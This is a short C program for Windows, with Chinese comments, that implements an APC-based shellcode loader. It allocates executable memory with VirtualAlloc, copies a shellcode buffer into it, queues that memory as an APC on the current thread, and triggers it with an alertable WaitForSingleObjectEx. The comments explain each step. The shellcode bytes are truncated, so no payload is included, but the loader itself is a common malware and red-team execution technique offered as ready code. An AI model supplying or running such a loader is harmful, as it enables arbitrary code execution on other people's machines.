#include <windows.h>
#include <stdio.h>


int main() {
    // 定义shellcode
    unsigned char shellcode[] = "\xfc\x48\x83...";


    // 申请内存
    PVOID addr = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);


    // 拷贝shellcode到申请的内存
    memcpy(addr, shellcode, sizeof(shellcode));


    // 为当前线程创建一个新的用户模式APC队列，队列中有一个函数
    // 第一个参数为要执行的函数，指向申请内存的指针被强制转换为函数指针类型
    // 第二个参数是线程句柄，通过GetCurrentThread()获取当前线程的伪句柄
    // 第三个参数是要执行函数的参数，当前执行的函数无需参数，所以为NULL
    QueueUserAPC((PAPCFUNC)addr, GetCurrentThread(), NULL);


    // 这个函数使当前线程进入警报的wait状态
    // INFINITE表示这个wait是无期限的，也就是不会超时，线程会等候直到APC函数被执行或者其它形式的唤醒被触发
    // TRUE参数表示这个wait是警报状态的，那会触发APC队列中的函数执行
    WaitForSingleObjectEx(GetCurrentThread(), INFINITE, TRUE);

    return 0;
}